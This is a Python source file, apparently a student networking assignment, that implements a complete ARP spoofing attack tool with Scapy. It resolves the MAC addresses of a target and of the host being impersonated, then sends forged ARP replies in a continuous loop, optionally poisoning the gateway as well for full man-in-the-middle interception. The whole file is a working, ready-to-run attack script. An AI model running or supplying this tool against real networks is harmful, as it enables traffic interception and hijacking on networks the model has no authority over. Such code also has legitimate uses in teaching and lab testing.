# shachar markovich 211491766
# naor maman        207341777

import argparse
from time import sleep

from scapy.all import *
from scapy.layers.l2 import ARP, Ether

MAC_BROADCAST_ADDR = 'ff:ff:ff:ff:ff:ff'


def get_args():
    """
    parse the line arguments
    :return: the line arguments
    """
    parser = argparse.ArgumentParser(description='Spoof ARP tables')
    # set up arguments
    parser.add_argument("-i", "--iface", metavar="IFACE", help="Interface you wish to use", dest='iface')
    parser.add_argument("-s", "--src", metavar="SRC", help="The address you want for the attacker", dest='src',
                        required=True)
    parser.add_argument("-d", "--delay", metavar="DELAY", help="Delay (in seconds) between messages", dest='delay',
                        default=1)
    parser.add_argument("-gw", metavar=bool, help="should GW be attacked as well", dest='gateway')
    parser.add_argument("-t", "--target", metavar="TARGET", help="IP of target", dest='target', required=True)

    return parser.parse_args()


class Spoofer:
    """
    This class management the ARP spoofer attack
    """

    def __init__(self, target_ip, impostor_ip, delay, iface, is_full):
        """
        init new Spoofer object
        :param target_ip: the target machine's ip
        :type target_ip: str
        :param impostor_ip: the machine's ip which we are impostor to him
        :type impostor_ip: str
        :param delay: the delay between each sending of arp replay msg, in seconds
        :type delay: str
        :param iface: the interface we work with
        :type iface: str
        :param is_full: if the attack is Full duplex or Half duplex.
        :type is_full: str
        """
        # default value is default iface
        self.iface = iface if iface is not None else conf.iface if sys.platform == "linux" else conf.iface.description
        self.target_ip = target_ip
        self.target_mac = self.get_mac(target_ip)

        self.impostor_ip = impostor_ip
        self.impostor_mac = self.get_mac(impostor_ip)

        self.delay = float(delay) if delay is not None else 1  # default value is 1 sec

        self.is_full = is_full if is_full is not None else False  # default value is Half duplex

    def get_mac(self, ip):
        """
        get the matches mac addr, using arp request
        :param ip: the ip
        :type ip: str
        :return: the matches mac addr
        :rtype: str
        """
        arp_who_has = Ether(dst=MAC_BROADCAST_ADDR) / ARP(pdst=ip)
        arp_is_at = srp1(arp_who_has, iface=self.iface, verbose=False)
        return arp_is_at[ARP].hwsrc

    def start(self):
        try:
            self.run()
        except KeyboardInterrupt:
            print("\n[-] Ctrl + C detected.....")

    def run(self):
        """
        run the ARP spoofing attack
        """
        count = 0
        while True:
            self.send_fake_arp_replay(self.target_ip, self.impostor_ip, self.target_mac)
            count += 1
            if self.is_full:
                count += 1
                self.send_fake_arp_replay(self.impostor_ip, self.target_ip, self.impostor_mac)

            print(f"[+] Packets Sent: {count}")
            sleep(self.delay)

    def send_fake_arp_replay(self, target_ip, impostor_ip, target_mac):
        """
        send a arp replay to target computer, says that fake_ip locate in this mac
        :param target_ip: target machine's ip
        :type target_ip: str
        :param impostor_ip: the computer IP which we are impostor to him
        :type impostor_ip: str
        :param target_mac: target machine's mac
        :type target_mac: str
        """

        fake_arp_replay = Ether(src=get_if_hwaddr(self.iface), dst=target_mac) / ARP(op=2, psrc=impostor_ip,
                                                                                     hwsrc=get_if_hwaddr(self.iface),
                                                                                     hwdst=target_mac, pdst=target_ip)
        sendp(fake_arp_replay, verbose=False, iface=self.iface)


def main():
    args = get_args()
    arp_spoofer = Spoofer(args.target, args.src, args.delay, args.iface, args.gateway)
    arp_spoofer.start()


if __name__ == "__main__":
    main()
